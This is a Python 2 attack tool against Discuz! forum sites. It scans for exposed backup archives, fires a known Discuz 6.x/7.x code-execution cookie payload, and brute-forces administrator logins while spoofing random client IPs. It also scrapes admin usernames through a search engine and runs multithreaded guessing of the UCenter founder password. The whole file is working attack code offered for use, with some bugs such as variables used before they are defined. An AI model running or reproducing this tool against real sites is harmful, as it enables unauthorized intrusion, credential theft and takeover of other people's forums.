# coding:utf-8
import httplib,re,random,urllib,time,argparse,requests,urllib2,urlparse,sys
from sys import argv
from threading import Thread
from Queue import Queue

if(len(argv)==1):
    print """
ExamPle:
python %s  --host=www.baidu.com --path=/ 
python %s  --host=www.baidu.com --path=/dz7/ --burpdz=dz --password=1.txt
python %s  --host=www.baidu.com --path=/dz7/  --burpuc=uc --password=2.txt
    """  % (argv[0],argv[0],argv[0])
    sys.exit()

def VulScan(host, path):
    
    hostuser = host.split('.')

    hostuser = hostuser[len(hostuser)-2]

    scan =  [hostuser+'.rar',hostuser+'.zip',hostuser+hostuser,hostuser+'.rar',hostuser+'.tar.gz',hostuser+'.tar',hostuser+'123.zip',hostuser+'123.tar.gz',hostuser+hostuser+'.zip',hostuser+hostuser+'.tar.gz',hostuser+hostuser+'.tar']

    f = open('DZ.txt','r')
    
    lujing = f.read().split('\n')

    host1 = scan+lujing
    
    for i in range(len(host1)):
      
        url = host+path+host1[i]        
        #host = host+host1[j]

        url = 'http://'+url
        
        #print url

        code = requests.get(url, allow_redirects = False).status_code

        if code == 200  :

            print "%s ===> Found!!" % url

def CodeExecution(host, path):

    cookie = 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/e; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'

    host = 'http://'+host+path

    ret = urlparse.urlparse(host)          # Parse input URL

    if ret.scheme == 'http':

        conn = httplib.HTTPConnection(ret.netloc)

    elif ret.scheme == 'https':

        conn = httplib.HTTPSConnection(ret.netloc)

    conn.request(method='GET', url=host+'/index.php' )#, headers={'Cookie': cookie})

    res = conn.getresponse()

    body = res.read()

    #print body
    reg = "<p><a href=\"(.*?)\">"

    dicList = re.compile(reg).findall(body)

    #print dicList

    if len(dicList) != 0:

        a = dicList[0]

        b=a.replace('amp;','')

        host1 = host+'/'+b
        
        #print host1

        conn.request(method='GET', url=host1, headers={'Cookie': cookie})

        res = conn.getresponse()

        body = res.read()

        result = body.find('PHP Variables')

        if result != -1 :

            print "the %s have Dz7.X 6.X CodeExecution! " %host
       

#进行爆破Discuz

def BurpDZ(host, path, passfile):

    # print '密码字典为  '+passfile

    # print '间隔时间为  '+sleeptime

    # print '--->'
    
    print host

    hostuser = host.split('.')

    hostuser = hostuser[len(hostuser)-2]

    hostpass = [hostuser+'123',hostuser+'888',hostuser+hostuser,hostuser+'..',hostuser+'.',hostuser+'admin888',hostuser+'admin123',hostuser+'admin',hostuser+'123456']

    ip = str(random.randint(1,100))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))

    httpHead = {"Host":host,"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0","X-Forwarded-For":ip,'Content-Type':'application/x-www-form-urlencoded','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'keep-alive'}

    f=open(passfile,'r')

    htmlpass=f.read().split('\r\n')

    password=hostpass+htmlpass

    f.close()

    for j in range(len(user)):

        for i in range(len(password)):

            print '正在尝试用户'+user[j]

            print '正在尝试密码'+password[i]

            url = path+"member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1&handlekey=ls&quickforward=yes&username=%s&password=%s"  %(user[j], password[i])

            target = host+url

            print target
    
            ret = urlparse.urlparse(host)          # Parse input URL

            if ret.scheme == 'http':

                conn = httplib.HTTPConnection(ret.netloc)

            elif ret.scheme == 'https':

                conn = httplib.HTTPSConnection(ret.netloc)

            conn.request(method='GET', url=target, headers=httpHead)    
        
            res = conn.getresponse()

            body = res.read()

            result = body.find('window.location.href')

            if result != -1 :
                print "the %s Admin : %s  Password: %s " %(host, user, password)

def testucserver(host):
    
    ucapi='http://'+host+path+'uc_server'

    #print ucapi

    try:

        t = requests.get(ucapi+'/index.php?m=app&a=ucinfo&release='+ucclientrelease)

        if 'UC_STATUS_OK' in t.text:

            return True

    except:

        pass

    return False

def brute(host,path):

    ucapi='http://'+host+path+'uc_server'

    #print ucapi

    while True:

        founderpw=q.get()
        
        print founderpw

        data={'m':'app','a':'add','ucfounder':'','ucfounderpw':founderpw,'apptype':apptype,'appname':appname,'appurl':appurl,'appip':'','appcharset':'gbk','appdbcharset':'gbk','release':ucclientrelease}
        
        posturl=ucapi+'/index.php'

        r = requests.post(posturl,data)

        while r.status_code!=200:

            r = requests.post(posturl,data)

        rt=r.text
        #print rt
        if rt!='-1' and rt!='':
            print 'Founder Password found! : '+founderpw
            print rt
            sys.exit()
        
        q.task_done()

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Fuck Disucz')

    parser.add_argument('--host', action="store", dest="host")

    parser.add_argument('--path', action="store", dest="path")

    parser.add_argument('--burpdz', action="store", dest="dz")

    parser.add_argument('--burpuc', action="store", dest="uc")

    parser.add_argument('--password', action="store", dest="passfile")

    given_args = parser.parse_args()

    host = given_args.host

    path = given_args.path

    dz = given_args.dz

    uc = given_args.uc

    passfile = given_args.passfile

    VulScan(host, path)

    CodeExecution(host, path)
    
    if dz == 'Dz':

        url = 'http://z7.cc/search/?q=用户组+管理员+site:%s+inurl:profile' % host

        ret = urlparse.urlparse(url)

        conn = httplib.HTTPConnection(ret.netloc)

        conn.request(method='GET', url=url)

        res = conn.getresponse()

        body = res.read()

        reg = "target=\"_blank\">([a-zA-z0-9.]+?)的个人资料" 

        user = re.compile(reg).findall(body)

        print user

        #print user

        BurpDZ(host, path, passfile)
   
    if uc == 'uc':
        
        NUM=5

        apptype='DISCUZX'
        
        appname='Discuz!'
        
        appurl='localhost'
        
        ucclientrelease='20110501'

    if testucserver(host)==False:

        print 'UCAPI error'

        sys.exit()

    q=Queue()

    for i in range(NUM):

        #print host

        t = Thread(target=brute,args=(host, path))

        t.daemon=True

        t.start()

    print 'Threads started'
    
    with open(passfile) as f:
        for line in f:
            pw = line.strip()
            q.put(pw)
    f.close()
    q.join()
